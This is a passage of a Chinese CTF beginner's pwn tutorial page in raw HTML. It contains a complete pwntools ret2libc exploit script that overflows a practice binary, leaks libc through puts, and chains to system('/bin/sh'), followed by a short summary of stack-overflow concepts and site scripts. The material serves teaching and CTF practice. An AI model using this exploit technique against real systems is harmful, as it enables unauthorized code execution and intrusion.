class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>



<p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p>
<h2 id="EZzzz的heap"><a href="#EZzzz的heap" class="headerlink" title="EZzzz的heap"></a>EZzzz的heap</h2><p><em>待补充……</em></p>
<h3 id="linux-heap的分配"><a href="#linux-heap的分配" class="headerlink" title="linux heap的分配"></a>linux heap的分配</h3><h3 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h3>
    </div>

    
    
    

    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>hacbit
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/" title="pwn新手村">http://hacbit.tech/pwn新手村/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/NSSround14wp/" rel="next" title="NSSround14wp">
      NSSround14wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9F%E8%AE%B8%E9%9C%80%E8%A6%81nc%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%81"><span class="nav-number">2.</span> <span class="nav-text">也许需要nc一下？！</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E7%BC%93%E5%86%B2%E5%8C%BA%EF%BC%9F%EF%BC%81%E6%BA%A2%E5%87%BA%E4%B8%80%E4%B8%8B%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">这是什么？缓冲区？！溢出一下！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E3%81%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">3.1.</span> <span class="nav-text">栈の基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%EF%BC%9F%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">什么是栈？（stack）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E5%B8%A7%EF%BC%9F%EF%BC%88stack-frame%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">什么是栈帧？（stack frame）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bss%EF%BC%8Cdata%EF%BC%8Ctext%EF%BC%8Cheap-amp-stack"><span class="nav-number">3.2.</span> <span class="nav-text">bss，data，text，heap &amp; stack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-segment%EF%BC%9A"><span class="nav-number">3.2.1.</span> <span class="nav-text">bss segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-segment%EF%BC%9A"><span class="nav-number">3.2.2.</span> <span class="nav-text">data segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code-text-segment%EF%BC%9A"><span class="nav-number">3.2.3.</span> <span class="nav-text">code(text) segment：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%EF%BC%88heap%EF%BC%89%EF%BC%9A"><span class="nav-number">3.2.4.</span> <span class="nav-text">堆（heap）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%EF%BC%88stack%EF%BC%89"><span class="nav-number">3.2.5.</span> <span class="nav-text">栈（stack）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools%E5%9F%BA%E7%A1%80"><span class="nav-number">3.3.</span> <span class="nav-text">pwntools基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="nav-number">3.3.1.</span> <span class="nav-text">安装pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">pwntools使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A1%86%E6%9E%B6"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">基本框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#send-or-receive"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">send or receive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%89%93%E5%8C%85"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">数据打包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">输出数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cyclic-pattern"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">Cyclic pattern</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">ELF文件操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">3.4.</span> <span class="nav-text">ELF文件保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Canary"><span class="nav-number">3.4.1.</span> <span class="nav-text">Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NX%EF%BC%88DEP%EF%BC%89"><span class="nav-number">3.4.2.</span> <span class="nav-text">NX（DEP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE%EF%BC%88ASLR%EF%BC%89"><span class="nav-number">3.4.3.</span> <span class="nav-text">PIE（ASLR）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RELRO"><span class="nav-number">3.4.4.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FORTIFY"><span class="nav-number">3.4.5.</span> <span class="nav-text">FORTIFY</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%AFbabyROP%E5%90%A7"><span class="nav-number">3.5.</span> <span class="nav-text">是babyROP吧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">3.5.1.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2text"><span class="nav-number">3.5.1.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.5.1.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.5.1.3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.5.1.4.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZzzz%E7%9A%84heap"><span class="nav-number">3.6.</span> <span class="nav-text">EZzzz的heap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-heap%E7%9A%84%E5%88%86%E9%85%8D"><span class="nav-number">3.6.1.</span> <span class="nav-text">linux heap的分配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap-overflow"><span class="nav-number">3.6.2.</span> <span class="nav-text">heap overflow</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hacbit"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">hacbit</p>
  <div class="site-description" itemprop="description">The world open itself before those with noble heart.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">4</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/hacbit" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hacbit" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:hacbit@foxmail.com" title="E-Mail → mailto:hacbit@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/hacbit33046" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;hacbit33046" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://pixiv.net/users/93650617" title="Pixiv → https:&#x2F;&#x2F;pixiv.net&#x2F;users&#x2F;93650617" rel="noopener" target="_blank"><i class="fab fa-pixiv fa-fw"></i>Pixiv</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com" rel="noopener" target="_blank">Github</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.bing.com/" title="https:&#x2F;&#x2F;www.bing.com" rel="noopener" target="_blank">Bing</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.google.com/" title="https:&#x2F;&#x2F;www.google.com" rel="noopener" target="_blank">Google</a>
        </li>
    </ul>
  </div>
<div style="">
  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
</div>
<script>
(function(){

   var digit=
    [
        [
            [0,0,1,1,1,0,0],
            [0,1,1,0,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,0,1,1,0],
            [0,0,1,1,1,0,0]
        ],//0
        [
            [0,0,0,1,1,0,0],
            [0,1,1,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [1,1,1,1,1,1,1]
        ],//1
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,0,0,0],
            [0,1,1,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,0,0,0,1,1],
            [1,1,1,1,1,1,1]
        ],//2
        [
            [1,1,1,1,1,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,1,1,0],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//3
        [
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,1,0],
            [0,0,1,1,1,1,0],
            [0,1,1,0,1,1,0],
            [1,1,0,0,1,1,0],
            [1,1,1,1,1,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,1,1]
        ],//4
        [
            [1,1,1,1,1,1,1],
            [1,1,0,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,1,1,1,1,0],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//5
        [
            [0,0,0,0,1,1,0],
            [0,0,1,1,0,0,0],
            [0,1,1,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,0,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//6
        [
            [1,1,1,1,1,1,1],
            [1,1,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0]
        ],//7
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//8
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,1,1,0,0,0,0]
        ],//9
        [
            [0,0,0,0,0,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,0,0,0],
            [0,0,0,0,0,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,0,0,0]
        ]//:
    ];

var canvas = document.getElementById('canvas');

if(canvas.getContext){
    var cxt = canvas.getContext('2d');
    //声明canvas的宽高
    var H = 100,W = 700;
    canvas.height = H;
    canvas.width = W;
    cxt.fillStyle = '#f00';
    cxt.fillRect(10,10,50,50);

    //存储时间数据
    var data = [];
    //存储运动的小球
    var balls = [];
    //设置粒子半径
    var R = canvas.height/20-1;
    (function(){
        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
    })();

    /*生成点阵数字*/
    function renderDigit(index,num){
        for(var i = 0; i < digit[num].length; i++){
            for(var j = 0; j < digit[num][i].length; j++){
                if(digit[num][i][j] == 1){
                    cxt.beginPath();
                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
                    cxt.closePath();
                    cxt.fill();
                }
            }
        }
    }

    /*更新时钟*/
    function updateDigitTime(){
        var changeNumArray = [];
        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
        var NewData = [];
        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
        for(var i = data.length-1; i >=0 ; i--){
            //时间发生变化
            if(NewData[i] !== data[i]){
                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
            }
        }
        //增加小球
        for(var i = 0; i< changeNumArray.length; i++){
            addBalls.apply(this,changeNumArray[i].split('_'));
        }
        data = NewData.concat();
    }

    /*更新小球状态*/
    function updateBalls(){
        for(var i = 0; i < balls.length; i++){
            balls[i].stepY += balls[i].disY;
            balls[i].x += balls[i].stepX;
            balls[i].y += balls[i].stepY;
            if(balls[i].x > W + R || balls[i].y > H + R){
                balls.splice(i,1);
                i--;
            }
        }
    }

    /*增加要运动的小球*/
    function addBalls(index,num){
        var numArray = [1,2,3];
        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
        for(var i = 0; i < digit[num].length; i++){
            for(var j = 0; j < digit[num][i].length; j++){
                if(digit[num][i][j] == 1){
                    var ball = {
                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
                        y:i*2*(R+1)+(R+1),
                        stepX:Math.floor(Math.random() * 4 -2),
                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
                        disY:1
                    };
                    balls.push(ball);
                }
            }
        }
    }

    /*渲染*/
    function render(){
        //重置画布宽度，达到清空画布的效果
        canvas.height = 100;
        //渲染时钟
        for(var i = 0; i < data.length; i++){
            renderDigit(i,data[i]);
        }
        //渲染小球
        for(var i = 0; i < balls.length; i++){
            cxt.beginPath();
            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
            cxt.fillStyle = balls[i].color;
            cxt.closePath();
            cxt.fill();
        }
    }

    clearInterval(oTimer);
    var oTimer = setInterval(function(){
        //更新时钟
        updateDigitTime();
        //更新小球状态
        updateBalls();
        //渲染
        render();
    },50);
}

})();
</script>
      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Tue Jun 20 2023 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hacbit</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">9k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">17 mins.</span>
</div>
  <div class="powered-by">
    <!--Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> -->
  </div>

<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">The blog has a total of 8.7k words</span>
</div>


  <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  <span id="busuanzi_container_site_pv">total visits<span id="busuanzi_value_site_pv"></span> times</span>
  <span class="post-meta-divider">|</span>
  <span id="busuanzi_container_site_uv">total visitors<span id="busuanzi_value_site_uv"></span> people</span>
  <span class="post-meta-divider">|</span>

<!-- 初始值纠正 -->
<script>
  $(document).ready(function() {
    var int = setInterval(fixCount, 50); // 每50毫秒执行一次fixCount函数
    var countOffset = 20000; // 初始值偏移量
    var fixCount = function() {
      if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
      if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        } 
    }
  });
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='123,174,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>











<script>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'neutral',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  





    <script type="text/javascript" src="/js/firework.js"></script>



  <script type="text/javascript" src="/js/click_show_text.js"></script>




</body>
</html>
